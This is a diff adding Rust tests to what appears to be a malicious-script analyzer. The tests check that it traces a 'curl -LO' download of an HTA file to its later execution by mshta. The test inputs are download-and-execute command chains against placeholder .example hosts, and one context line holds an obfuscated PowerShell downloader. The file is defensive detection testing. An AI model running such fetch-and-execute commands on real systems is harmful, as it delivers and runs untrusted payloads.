@@ -7769,6 +7769,41 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_short_option_cluster_remote_name_uses_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -LO https://curl-cluster-remote-name.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_dst = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-cluster-remote-name.example/payload.hta"
+                        && dst == "payload.hta"
+            )
+        });
+        assert!(
+            has_download_dst,
+            "curl -LO did not record remote-name destination: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://curl-cluster-remote-name.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve curl -LO download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_remote_name_with_output_dir_tracks_joined_destination_for_later_execution() {
         let report = crate::analyze(
             br#"curl --output-dir C:\Temp -O https://curl-output-dir-mshta.example/payload.hta
@@ -19581,6 +19616,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "curl short-option cluster destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_remote_name_short_option_cluster_in_deob_text_uses_basename() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl -LO https://curl-cluster-remote-name-deob.example/payload.hta"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-cluster-remote-name-deob.example/payload.hta"
+                        && dst.as_deref() == Some("payload.hta")
+            )
+        });
+        assert!(
+            has,
+            "curl deob-text -LO remote-name destination not recovered: {:?}",
             env.traits
         );
     }
